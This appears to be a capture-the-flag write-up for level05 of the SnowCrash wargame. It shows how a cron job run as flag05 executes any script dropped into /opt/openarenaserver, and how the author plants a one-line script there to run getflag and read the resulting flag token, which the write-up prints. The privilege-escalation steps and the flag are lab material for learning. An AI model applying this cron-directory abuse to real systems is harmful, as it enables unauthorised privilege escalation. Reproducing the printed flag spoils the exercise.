When logging to level 5 we have the message:
`You have a mail.

```
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
By looking at the cron task we can see that every 2minutes the script /usr/sbin/openarenaserver is executed by flag05

We openend the file `openarenaserver` with cat:
```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

The system executes every script placed into the /opt/openarenaserver directory and then deletes it.
We can't use vim to write a script there because we don't have rights, but can use this behavior to build an exploit.

`echo "getflag > /tmp/getflag" > /opt/openarenaserver/getflag.sh`

and we wait 2mn for the script to execut.
then we just have to do: 
```
flag01@SnowCrash:~$ cat /tmp/getflag
viuaaale9huek52boumoomioc
```